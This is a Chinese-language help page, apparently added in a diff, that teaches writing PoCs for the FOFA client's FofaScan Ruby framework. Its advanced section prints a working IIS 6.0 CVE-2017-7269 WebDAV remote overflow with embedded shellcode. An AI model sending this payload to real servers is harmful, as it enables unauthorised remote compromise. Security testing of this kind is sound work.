@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>挑选漏洞</title>
+
+
+<style type="text/css">
+body.poc_help {
+  font-family: Helvetica, arial, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  padding-top: 10px;
+  padding-bottom: 10px;
+  background-color: white;
+  padding: 30px; }
+
+body.poc_help > *:first-child {
+  margin-top: 0 !important; }
+body.poc_help > *:last-child {
+  margin-bottom: 0 !important; }
+
+.poc_help a {
+  color: #4183C4; }
+.poc_help a.absent {
+  color: #cc0000; }
+.poc_help a.anchor {
+  display: block;
+  padding-left: 30px;
+  margin-left: -30px;
+  cursor: pointer;
+  position: absolute;
+  top: 0;
+  left: 0;
+  bottom: 0; }
+
+.poc_help h1, .poc_help h2, .poc_help h3, .poc_help h4, .poc_help h5,.poc_help h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+  cursor: text;
+  position: relative; }
+
+h1:hover a.anchor, h2:hover a.anchor, h3:hover a.anchor, h4:hover a.anchor, h5:hover a.anchor, h6:hover a.anchor {
+  background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA09pVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoMTMuMCAyMDEyMDMwNS5tLjQxNSAyMDEyLzAzLzA1OjIxOjAwOjAwKSAgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OUM2NjlDQjI4ODBGMTFFMTg1ODlEODNERDJBRjUwQTQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OUM2NjlDQjM4ODBGMTFFMTg1ODlEODNERDJBRjUwQTQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5QzY2OUNCMDg4MEYxMUUxODU4OUQ4M0REMkFGNTBBNCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5QzY2OUNCMTg4MEYxMUUxODU4OUQ4M0REMkFGNTBBNCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsQhXeAAAABfSURBVHjaYvz//z8DJYCRUgMYQAbAMBQIAvEqkBQWXI6sHqwHiwG70TTBxGaiWwjCTGgOUgJiF1J8wMRAIUA34B4Q76HUBelAfJYSA0CuMIEaRP8wGIkGMA54bgQIMACAmkXJi0hKJQAAAABJRU5ErkJggg==) no-repeat 10px center;
+  text-decoration: none; }
+
+.poc_help h1 tt, .poc_help h1 code {
+  font-size: inherit; }
+
+.poc_help h2 tt, .poc_help h2 code {
+  font-size: inherit; }
+
+.poc_help h3 tt, .poc_help h3 code {
+  font-size: inherit; }
+
+.poc_help h4 tt,.poc_help h4 code {
+  font-size: inherit; }
+
+h5 tt, h5 code {
+  font-size: inherit; }
+
+h6 tt, h6 code {
+  font-size: inherit; }
+
+.poc_help h1 {
+  font-size: 16px;
+  color: black; }
+
+.poc_help h2 {
+  font-size: 16px;
+  border-bottom: 1px solid #cccccc;
+  color: black; }
+
+.poc_help h3 {
+  font-size: 16px; }
+
+.poc_help h4 {
+  font-size: 16px; }
+
+.poc_help h5 {
+  font-size: 14px; }
+
+.poc_help h6 {
+  color: #777777;
+  font-size: 14px; }
+
+.poc_help p, .poc_help blockquote, .poc_help ul, .poc_help ol, .poc_help dl, .poc_help li, .poc_help table, .poc_help pre {
+  margin: 15px 0; }
+
+.poc_help hr {
+  background: transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAECAYAAACtBE5DAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBNYWNpbnRvc2giIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OENDRjNBN0E2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OENDRjNBN0I2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo4Q0NGM0E3ODY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo4Q0NGM0E3OTY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqqezsUAAAAfSURBVHjaYmRABcYwBiM2QSA4y4hNEKYDQxAEAAIMAHNGAzhkPOlYAAAAAElFTkSuQmCC) repeat-x 0 0;
+  border: 0 none;
+  color: #cccccc;
+  height: 4px;
+  padding: 0;
+}
+
+body.poc_help > h2:first-child {
+  margin-top: 0;
+  padding-top: 0; }
+body.poc_help > h1:first-child {
+  margin-top: 0;
+  padding-top: 0; }
+  body > h1:first-child + h2 {
+    margin-top: 0;
+    padding-top: 0; }
+body.poc_help > h3:first-child, body > h4:first-child, body > h5:first-child, body > h6:first-child {
+  margin-top: 0;
+  padding-top: 0; }
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0; }
+
+.poc_help h1 p, .poc_help h2 p, .poc_help h3 p, .poc_help h4 p, .poc_help h5 p, .poc_help h6 p {
+  margin-top: 0; }
+
+.poc_help li p.first {
+  display: inline-block; }
+.poc_help li {
+  margin: 0; }
+.poc_help ul, .poc_help ol {
+  padding-left: 30px; }
+
+.poc_help ul :first-child, .poc_help ol :first-child {
+  margin-top: 0; }
+
+.poc_help dl {
+  padding: 0; }
+  .poc_help dl dt {
+    font-size: 14px;
+    font-weight: bold;
+    font-style: italic;
+    padding: 0;
+    margin: 15px 0 5px; }
+    dl dt:first-child {
+      padding: 0; }
+    dl dt > :first-child {
+      margin-top: 0; }
+    dl dt > :last-child {
+      margin-bottom: 0; }
+  .poc_help dl dd {
+    margin: 0 0 15px;
+    padding: 0 15px; }
+    dl dd > :first-child {
+      margin-top: 0; }
+    dl dd > :last-child {
+      margin-bottom: 0; }
+
+blockquote {
+  border-left: 4px solid #dddddd;
+  padding: 0 15px;
+  color: #777777; }
+  blockquote > :first-child {
+    margin-top: 0; }
+  blockquote > :last-child {
+    margin-bottom: 0; }
+
+table {
+  padding: 0;border-collapse: collapse; }
+  table tr {
+    border-top: 1px solid #cccccc;
+    background-color: white;
+    margin: 0;
+    padding: 0; }
+    table tr:nth-child(2n) {
+      background-color: #f8f8f8; }
+    table tr th {
+      font-weight: bold;
+      border: 1px solid #cccccc;
+      margin: 0;
+      padding: 6px 13px; }
+    table tr td {
+      border: 1px solid #cccccc;
+      margin: 0;
+      padding: 6px 13px; }
+    table tr th :first-child, table tr td :first-child {
+      margin-top: 0; }
+    table tr th :last-child, table tr td :last-child {
+      margin-bottom: 0; }
+
+.poc_help img {
+  max-width: 100%; }
+
+.poc_help span.frame {
+  display: block;
+  overflow: hidden; }
+  span.frame > span {
+    border: 1px solid #dddddd;
+    display: block;
+    float: left;
+    overflow: hidden;
+    margin: 13px 0 0;
+    padding: 7px;
+    width: auto; }
+  span.frame span img {
+    display: block;
+    float: left; }
+  span.frame span span {
+    clear: both;
+    color: #333333;
+    display: block;
+    padding: 5px 0 0; }
+span.align-center {
+  display: block;
+  overflow: hidden;
+  clear: both; }
+  span.align-center > span {
+    display: block;
+    overflow: hidden;
+    margin: 13px auto 0;
+    text-align: center; }
+  span.align-center span img {
+    margin: 0 auto;
+    text-align: center; }
+span.align-right {
+  display: block;
+  overflow: hidden;
+  clear: both; }
+  span.align-right > span {
+    display: block;
+    overflow: hidden;
+    margin: 13px 0 0;
+    text-align: right; }
+  span.align-right span img {
+    margin: 0;
+    text-align: right; }
+span.float-left {
+  display: block;
+  margin-right: 13px;
+  overflow: hidden;
+  float: left; }
+  span.float-left span {
+    margin: 13px 0 0; }
+span.float-right {
+  display: block;
+  margin-left: 13px;
+  overflow: hidden;
+  float: right; }
+  span.float-right > span {
+    display: block;
+    overflow: hidden;
+    margin: 13px auto 0;
+    text-align: right; }
+
+.poc_help code, .poc_help tt {
+  margin: 0 2px;
+  padding: 0 5px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px; }
+
+.poc_help pre code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent; }
+
+.poc_help .highlight pre {
+  background-color: #f8f8f8;
+  border: 1px solid #cccccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px; }
+
+.poc_help pre {
+  background-color: #f8f8f8;
+  border: 1px solid #cccccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px; }
+ .poc_help pre code, pre tt {
+    background-color: transparent;
+    border: none; }
+
+.poc_help sup {
+    font-size: 0.83em;
+    vertical-align: super;
+    line-height: 0;
+}
+
+.poc_help kbd {
+  display: inline-block;
+  padding: 3px 5px;
+  font-size: 11px;
+  line-height: 10px;
+  color: #555;
+  vertical-align: middle;
+  background-color: #fcfcfc;
+  border: solid 1px #ccc;
+  border-bottom-color: #bbb;
+  border-radius: 3px;
+  box-shadow: inset 0 -1px 0 #bbb
+}
+
+* {
+	-webkit-print-color-adjust: exact;
+}
+@media screen and (min-width: 914px) {
+    body {
+        width: 854px;
+        margin:0 auto;
+    }
+}
+@media print {
+	table, pre {
+		page-break-inside: avoid;
+	}
+	pre {
+		word-wrap: break-word;
+	}
+}
+
+</style>
+
+
+</head>
+
+<body class="poc_help">
+<h1>环境准备</h1>
+<ul>
+<li>FOFA客户端</li>
+<li>wireshark（监测PoC的发包是否符合预期）</li>
+</ul>
+<h1>挑选漏洞</h1>
+<ul>
+<li>fofa客户端里是否已有此漏洞PoC？</li>
+<li>是否能提取出对应程序的通用fofaquery？</li>
+<li>漏洞能否直接利用？</li>
+<li>漏洞是否能使用程序自动化完成？</li>
+</ul>
+<hr />
+<h1>初级FOFA PoC编写</h1>
+<p><code>仅需要了解http协议即可可视化编辑初级PoC，无需懂相关编程语言：）</code></p>
+<h2>填写测试步骤</h2>
+<p><img src="../images/help/image1.png" />
+所有的字段都是必填项，要注意的是以下几点： </p>
+<ul>
+<li>
+<p>标题：此字段应以<strong>&quot;产品名&nbsp;&nbsp;[版本]&nbsp;&nbsp;漏洞文件名&nbsp;&nbsp;漏洞名&nbsp;&nbsp;&quot;</strong>格式保存,版本号为可选项，如无法确认版本可省略，例如：WordPress全版本upload.php任意文件上传.</p>
+</li>
+<li>
+<p>发现日期：此字段对应的是漏洞的披露时间，FOFA客户端会给一个默认值为当前日期，但是需要注意修改为正确的漏洞披露时间，如果是0day就无需更改。</p>
+</li>
+<li>
+<p>来源：此字段对应的是在哪里披露此漏洞详情的，注意修改。</p>
+</li>
+<li>
+<p>漏洞等级：级别为严重、高危、中危、低危，白帽子通过实际的情况判断漏洞等级。</p>
+</li>
+<li>
+<p>FOFA查询规则：在<strong>产品</strong>字段输入相应的产品名，如果自动补全了产品名，双击补全的产品名之后，对应的<strong>FOFA查询规则</strong>也会补全。如果没有自动补全，则需要手动构造FOFA查询规则，构造方法见：<a href="https://fofa.so/">FOFA首页</a><img src="../images/help/image2.png" /></p>
+</li>
+<li>其他的字段：选择产品的时候除了自动生成生成已存在的规则，同时也会生成产品的主页。漏洞影响和解决方案提供模板供白帽子选择，可以根据实际情况修改，若有补丁需贴出补丁的地址。</li>
+</ul>
+<h2>填写测试步骤</h2>
+<ol>
+<li>
+<p>填写第一个要发送的request请求：Request<br/><br />
+<img src="../images/help/image3.png" />
+所有的字段都是必填项，要注意的是以下几点：</p>
+<ul>
+<li>测试URI：此字段必须经过<strong>url编码</strong>，否则PoC无法正常运行。<br/>  
+</li>
+<li>request请求组右方的逻辑符为<strong>AND</strong>时，表示<strong>所有的ResponseTest都满足<strong>时才会显示漏洞存在，为</strong>OR</strong>时表示只需要<strong>满足一个ResponseTest</strong>就显示漏洞存在。<br/>  
+</li>
+</ul>
+</li>
+<li>
+<p>填写第一个要验证的response响应：ResponseTest<br/>
+<code>小提示：右键测试组可新增测试组或测试项、右键测试项可删除或剪切测试项</code> <br/><br />
+<img src="../images/help/image4.png" />
+所有的字段都是必填项，要注意的是以下几点：</p>
+<ul>
+<li>当然<strong>变量字段</strong>为<strong>HTTP响应码<strong>时，</strong>操作字段</strong>只能为<strong>等于</strong>或者<strong>不等于</strong>，否则可能会引发异常。<br/>  
+</li>
+</ul>
+</li>
+<li>
+<p>点击请求组右方的➕（加号）可继续添加Request／ResponseTest.</p>
+</li>
+</ol>
+<h2>单例测试</h2>
+<p>将自己本地搭建的漏洞环境或互联网上已存在的漏洞案例进行测试
+<img src="../images/help/image5.png" /></p>
+<h1>中级FOFA PoC编写</h1>
+<p><code>仅需要了解http协议以及变量的概念即可可视化编辑初级PoC，无需懂相关编程语言：）</code></p>
+<hr />
+<h2>自定义变量的应用</h2>
+<ol>
+<li>
+<p>设置变量
+<img src="../images/help/image6.png" />
+第一个输入框为要设置的<strong>变量名</strong><br />
+第二个输入框为<strong>正则表达式<strong>，括号内为要赋给变量的</strong>值</strong><br />
+第三个下拉框表示要从哪取值：</p>
+<ul>
+<li>lastbody：本次response的响应体body</li>
+<li>lastheader：本次response的响应头header</li>
+<li>statusline：本次response的响应状态statusline  
+</li>
+</ul>
+</li>
+<li>
+<p>使用变量
+<img src="../images/help/image7.png" />
+使用变量需要<code>{{{变量名}}}</code>此格式才能正确调用<br />
+<strong>只能使用上个请求取的变量，不能使用本次请求取的变量</strong></p>
+</li>
+</ol>
+<h1>高级FOFA PoC编写</h1>
+<p><code>需要了解http协议、ruby编程、socket网络编程</code></p>
+<hr />
+<h2>FOFASCAN扫描框架的使用</h2>
+<ol>
+<li>进入fofascan的目录，位于<strong>FOFA客户端目录/fofalib/fofascan</strong></li>
+<li>如果配置了环境变量则执行<code>ruby fofascan.rb</code>，没配置则需要使用ruby的绝对路径或者相对路径，FOFA客户端目录下附带了ruby，可直接使用。
+<img src="../images/help/image8.png" /></li>
+</ol>
+<h2>FOFA PoC说明</h2>
+<blockquote>
+<p>FOFA PoC的本质的一个ruby脚本<br />
+FOFA PoC依赖于FofaScan框架（开源，源码位于程序目录的fofalib下）  
+</p>
+</blockquote>
+<pre>
+	<code>
+require 'fofa_core'
+
+class FofaExploits < Fofa::Exploit
+  def get_info
+	{
+      "Name": "Exploit Name",
+      "Description": "Exploit Description",
+      "Product": "",
+      "Homepage": "https://fofa.so/",
+      "DisclosureDate": "2017-06-02",
+      "Author": "xxx",
+      "FofaQuery": "",
+      "References": "[\"https://fofa.so/\"]",
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "header": {},
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "cookie|statusline|regex|Set-Cookie:(.*?)"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "header": {},
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "fofacliversion": "1.0.15",
+      "Posttime": "2017-06-02 18:21:05",
+      "status": 0
+}
+	end
+
+
+  def initialize(info = {})
+    super( info.merge(get_info()) )
+  end
+
+  def vulnerable(hostinfo)
+    excute_scansteps(hostinfo) if @info['ScanSteps']
+  end
+
+  def exploit(hostinfo)
+  end
+end
+	</code>
+</pre>
+<ul>
+<li><strong>get_info</strong>函数用于获取PoC的基本信息以及测试步骤</li>
+<li><strong>initialize</strong>函数主要用于将get_info的返回数据进行初始化到类中</li>
+<li><strong>vulnerable</strong>函数主要用于从FOFA中取出<strong>hostinfo<strong>并进行漏洞验证，也就是执行在客户端中编写的</strong>测试步骤</strong>，并返回<strong>true</strong>或<strong>false</strong>，表示是否存在漏洞。</li>
+<li><strong>exploit</strong>函数会在<strong>vulnerable</strong>返回为true时执行，其中一般填写ruby的漏洞利用脚本。（执行fofascan的-o e参数时，此函数才会生效）</li>
+</ul>
+<h2>FOFA PoC自定义vulnerable函数</h2>
+<pre>
+	<code>
+	  def vulnerable(hostinfo)
+	    excute_scansteps(hostinfo) if @info['ScanSteps']
+	  end
+	</code>
+</pre>  
+<p>如果您熟悉ruby，大概一眼就能看出来，vulnerable函数实际时调用了FOFA PoC get_info函数中的ScanSteps</p>
+<p>在ScanSteps不满足PoC需要的时候，您大可以把<code>excute_scansteps(hostinfo) if @info['ScanSteps']</code>这行代码删除，FOFA PoC中编辑的<strong>测试步骤</strong>（ScanSteps）就无效了，直接用ruby脚本进行发包以及验证（不能引入第三方gem包），最终要return一个true或false。</p>
+<p>如果想在请求中使用随机数，或者其他的“活”的字符串，但又不想写原生的ruby http代码，怎么办呢。例如我想让Referer是随机数，可以如下:</p>
+<pre>
+	<code>
+	  def vulnerable(hostinfo)
+	  	info['ScanSteps'][1]["Request"]["header"]["Referer"]= rand(500).to_s
+	    excute_scansteps(hostinfo) if @info['ScanSteps']
+	  end
+	</code>
+</pre>
+<h2>编写二进制漏洞FOFA PoC</h2>
+<p><code>思路：自定义vulnerable函数，使用ruby编写socket程序</code><br />
+案例如下：<strong>IIS6.0 cve-2017-7269 远程溢出 FOFA PoC</strong>  
+</p>
+<pre>
+	<code>
+def vulnerable(hostinfo)
+  hostinfo = "http://"+hostinfo if !hostinfo.start_with?"http"
+  hostinfo = URI(hostinfo)
+  
+  buf1 = "If: <http://localhost/aaaaaaa"
+  buf1 << "\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac"
+  buf1 << ">"
+  buf1 << " (Not <locktoken:write1>) <http://localhost/bbbbbbb"
+  buf1 << "\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81"
+  shellcode = 'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397N10WRJLMSSI7LNR72JPTKOXPQ3PV0ENM02NPNQNWNMNWOBNVP9KPOS2O2NT4S52N44NMB4RYD0C5OJMPBTQURX44NORH2TRMBLLMKZPCRORNSDQU2N2TNMPL1URN2GT4S8OJOBOFMPLMKZLMLJOXOX1924MPOSPV0ENMNRP0NQNWNMOGNROFP9O01CRU3333RET3SCM0M0A'
+  
+  buf1 << shellcode
+  
+  
+  Socket.tcp(hostinfo.host, hostinfo.port,connect_timeout:5) {|sock|
+    sock.puts("PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n#{buf1}>\r\n\r\n")
+    res = sock.recv(1024)
+    if res.include?"HHIT CVE-2017-7269 Success"
+      return TRUE
+    end
+    sock.close_write
+  }
+  return FALSE
+end
+	</code>
+</pre>
+<h2>FOFA PoC的利用模块</h2>
+<p><code>思路：点击验证框，勾选漏洞验证，定义要接受的参数的名称、值。然后在exploit模块接受命令和参数利用。</code> 
+<img src="../images/help/image10.png" />
